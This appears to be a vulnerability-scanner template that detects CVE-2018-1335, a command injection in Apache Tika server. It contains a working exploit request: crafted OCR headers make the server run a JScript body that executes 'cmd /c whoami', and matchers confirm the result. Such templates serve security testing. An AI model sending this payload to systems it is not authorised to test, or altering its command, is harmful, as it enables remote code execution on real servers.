id: CVE-2018-1335

info:
  name: Apache Tika 1.15-1.17 Header Command Injection
  author: pikpikcu
  severity: high
  reference:
    - https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/
    - https://www.exploit-db.com/exploits/47208
  tags: cve,cve2018,apache,tika,rce
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.10
    cve-id: CVE-2018-1335
  description: "From Apache Tika versions 1.7 to 1.17, clients could send carefully crafted headers to tika-server that could be used to inject commands into the command line of the server running tika-server. This vulnerability only affects those running tika-server on a server that is open to untrusted clients. The mitigation is to upgrade to Tika 1.18."

requests:
  - method: PUT
    path:
      - "{{BaseURL}}/meta"
    headers:
      X-Tika-OCRTesseractPath: cscript
      X-Tika-OCRLanguage: //E:Jscript
      Expect: 100-continue
      Content-type: image/jp2
      Connection: close
    body: "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - "Content-Type: text/csv"
        part: header

      - type: word
        words:
          - "org.apache.tika.parser.DefaultParser"
          - "org.apache.tika.parser.gdal.GDALParse"
        part: body
        condition: and

      - type: status
        status:
          - 200
